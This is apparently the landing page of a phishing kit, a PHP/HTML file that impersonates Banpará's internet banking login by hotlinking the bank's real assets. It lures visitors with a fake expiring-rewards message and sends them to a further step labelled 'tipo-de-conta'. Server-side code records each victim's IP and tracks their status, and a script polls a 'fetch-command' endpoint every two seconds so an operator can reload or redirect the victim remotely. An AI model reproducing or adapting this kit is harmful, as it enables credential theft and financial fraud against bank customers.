<?php
if(!isset($_GET['a'])){
    exit;
}


$ip = $api->getUserIp();
$cliente_id = $api->registrarOuAtualizarCliente($ip);

if($api->isStatus($ip) == 'deletado'){
    header('Location: https://www.banpara.b.br/');
    exit;
}

if($api->isStatus($ip) == 'deletado2'){
    // exit;
        $api->deleteips($ip);
        header('Location: https://www.banpara.b.br/');
        exit;
    }

$api->atualizarColuna($cliente_id, 'tela', 'Home');
$api->atualizarColuna($cliente_id, 'modal', 'fechada');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title>Internet Banking Pessoa Física</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238">
    <link rel="icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238" type="image/x-icon">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/bootstrap.min.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/fontawesome.min.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/solid.min.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/material-kit.css?v=1.3.0&amp;20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/keyboard.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/rzslider.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/base/fontes.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/base/base.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/pagina/login.css?20231107130238">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/background.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
        }
        .topo {
            background-color: rgba(0, 35, 102, 0.8); /* Cor de fundo com transparência */
            color: #fff; /* Cor do texto no topo */
            padding: 10px 20px; /* Espaçamento interno */
            width: 100%; /* Largura total */
            position: absolute; /* Posição absoluta para sobrepor o conteúdo */
            top: 0; /* Alinhamento no topo */
            left: 0; /* Alinhamento à esquerda */
            z-index: 1000; /* Z-index alto para estar acima do conteúdo */
        }
        .topo .info-sistema {
            color: #fff; /* Cor específica para o texto "Versão: 1.34.0 - Banco de Estado do Pará ©" */
            font-size: 14px; /* Tamanho da fonte */
        }
        .topo .btn {
            font-size: 14px; /* Tamanho da fonte dos botões */
        }
        .conteudo {
            margin-top: 80px; /* Margem superior para afastar do topo */
            text-align: center; /* Centralizar o conteúdo */
            position: relative; /* Posição relativa para o conteúdo */
            z-index: 1; /* Z-index para estar abaixo do topo */
        }
        .conteudo-centralizado {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
            text-align: center;
            border-radius: 8px;
            color: #333; /* Cor do texto dentro do conteúdo */
            margin: 0 auto; /* Centralizar horizontalmente */
        }
        .conteudo-centralizado img {
            width: 150px;
            margin-bottom: 20px;
        }
        .conteudo-centralizado h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #002366; /* Cor do título */
        }
        .conteudo-centralizado p {
            font-size: 16px;
            color: #666; /* Cor do texto abaixo da logo */
        }
        @media (max-width: 768px) {
            .conteudo-centralizado {
                width: 90%;
                padding: 15px;
            }
            .conteudo-centralizado h1 {
                font-size: 20px;
            }
            .conteudo-centralizado p {
                font-size: 14px;
            }
            .conteudo-centralizado img {
                width: 120px;
            }
            .topo .info-sistema {
                font-size: 12px; /* Tamanho da fonte ajustado para telas menores */
            }
            .topo .btn {
                font-size: 12px; /* Tamanho da fonte dos botões ajustado para telas menores */
            }
        }
        @media (max-width: 480px) {
            .conteudo-centralizado h1 {
                font-size: 18px;
            }
            .conteudo-centralizado p {
                font-size: 12px;
            }
            .conteudo-centralizado img {
                width: 100px;
            }
            .topo .info-sistema {
                font-size: 10px; /* Tamanho da fonte ajustado para telas ainda menores */
            }
            .topo .btn {
                font-size: 10px; /* Tamanho da fonte dos botões ajustado para telas ainda menores */
            }
        }
         }
        .favicon {
            background-image: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238');
            width: 40px; /* Largura do favicon */
            height: 40px; /* Altura do favicon */
            background-size: cover; /* Para cobrir toda a área do div com o favicon */
            position: absolute; /* Posição absoluta para o favicon */
            top: 20px; /* Distância do topo */
            left: 50%; /* Centralizando horizontalmente */
            transform: translateX(-50%); /* Ajuste fino para centralizar */
            z-index: 1000; /* Z-index para estar acima do conteúdo */
        }
    </style>
</head>
<body>

<div class="topo">
    <div class="container">
        <div class="row justify-content-center"> <!-- Centraliza o conteúdo das colunas -->
            <div class="col-sm-4 text-left">
                
            </div>
            <div class="col-sm-8 text-right">
                <span class="info-sistema">Versão: 1.34.0 - Banco de Estado do Pará ©</span>
                <button class="btn btn-fonte neutro">A-</button>
                <button class="btn btn-fonte positivo">A</button>
                <button class="btn btn-fonte neutro">A+</button>
            </div>
        </div>
    </div>
    
</div>

<div class="conteudo">
    <main id="login-page" class="principal">
        <div class="conteudo-centralizado">
            <img src="https://internetbanking.banpara.b.br/ibpf/resources/imagens/logo_azul.png?20231107130238" alt="Logo Banpará">
            <h1>Seja bem-vindo(a) ao Banpará</h1>
            <p>Seu programa de recompensas. Resgate seus pontos acumulados que se expiram hoje. Ative os seus pontos e utilize os benefícios disponíveis que o Banpará preparou para você. A ativação dos seus benefícios será iniciada. Siga as instruções apresentadas a seguir. (ATIVE AGORA) Comece já!</p>
            <div class="row">
                <div class="col-sm-12 text-center">
                    <button class="btn positivo" type="button" name="acessar" tabindex="6" onclick="location.href='tipo-de-conta'">ative agora</button>
                </div>
            </div>
        </div>
    </main>
</div>

</body>
</html>
<script type="text/javascript">
    window.addEventListener('pageshow', function(event) {
        if (event.persisted) {
            fetch('home')
            location.reload();
        }
    });
    window.addEventListener('DOMContentLoaded', function() {
        const currentUrl = new URL(window.location.href);
        currentUrl.searchParams.set('timestamp', Date.now());
        window.history.replaceState({}, 'home', currentUrl);
    });


    function fetchCommand() {
        fetch('fetch-command')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {

                try{

                    const comando = JSON.parse(data.comando);

                    if (comando.command == "reload") {
                        location.reload();
                    }

                    if (comando.command == "redirect") {
                        window.location.href = 'https://www.banpara.b.br/';
                    }
             
                }catch(e){

                }
                
            } else if (data.status === 'no_command') {

            }
        })
        .catch(error => {
            console.error('Erro ao buscar comando:', error);
        });
    }

    function startPolling() {
        fetchCommand();
        setInterval(() => {
            fetchCommand();
        }, 2000);
    }

    window.onload = startPolling;
</script>